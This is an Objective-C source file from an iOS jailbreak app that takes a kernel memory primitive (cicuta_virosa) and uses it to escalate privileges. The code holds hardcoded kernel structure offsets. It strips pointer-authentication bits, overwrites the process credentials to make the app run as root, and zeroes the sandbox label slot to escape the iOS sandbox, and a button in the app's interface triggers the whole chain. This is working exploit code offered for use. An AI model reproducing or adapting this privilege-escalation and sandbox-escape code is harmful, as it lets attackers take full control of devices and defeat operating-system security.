//
//  ViewController.m
//  c0metjb_rc1
//
//  Created by Ali on 15.02.2021.
//

#import "ViewController.h"
#import "cicuta_virosa.h"
@interface ViewController ()

@end

@implementation ViewController
static unsigned off_p_pid = 0x68;               // proc_t::p_pid
static unsigned off_task = 0x10;                // proc_t::task
static unsigned off_p_uid = 0x30;               // proc_t::p_uid
static unsigned off_p_gid = 0x34;               // proc_t::p_uid
static unsigned off_p_ruid = 0x38;              // proc_t::p_uid
static unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
static unsigned off_p_ucred = 0xf0;            // proc_t::p_ucred
static unsigned off_p_csflags = 0x280;          // proc_t::p_csflags

static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
static unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
static unsigned off_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
static unsigned off_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
static unsigned off_ucred_cr_groups = 0x28;     // ucred::cr_groups
static unsigned off_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
static unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label

static unsigned off_sandbox_slot = 0x10;
static unsigned off_t_flags = 0x3a0; // task::t_flags
- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
}
int run_exploit(){
    NSLog(@"Running jailbreak");
    uint64_t task_pac = cicuta_virosa();
    printf("task PAC: 0x%llx\n", task_pac);
    uint64_t task = task_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", task_pac, task);
#if defined(__arm64e__)
    uint64_t proc_pac = read_64(task + 0x3a0);
#else
    uint64_t proc_pac = read_64(task + 0x390);
#endif
    printf("proc PAC: 0x%llx\n", proc_pac);
    uint64_t proc = proc_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", proc_pac, proc);
    uint64_t ucred_pac = read_64(proc + 0xf0);
    printf("ucred PAC: 0x%llx\n", ucred_pac);
    uint64_t ucred = ucred_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", ucred_pac, ucred);
    uint32_t buffer[5] = {0, 0, 0, 1, 0};
    
    write_20(ucred + off_ucred_cr_uid, (void*)buffer);

    uint32_t uid = getuid();
    printf("getuid() returns %u\n", uid);
    printf("whoami: %s\n", uid == 0 ? "root" : "mobile");
    printf("Escaping sandbox.\n");
    uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
    write_20(cr_label + off_sandbox_slot, (void*)buffer);
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/escaped" contents:nil attributes:nil];
    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/escaped"]){
        printf("Escaped sandbox!\n");
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/escaped" error:nil];
    } else {
        printf("Could not escape the sandbox\n");
    }
    printf("...\n");
    printf("...\n");
    sleep(1);
    return 0;
}
- (IBAction)post_exploit:(UIButton *)sender {
    run_exploit(); //this will bypass sandbox
}


@end
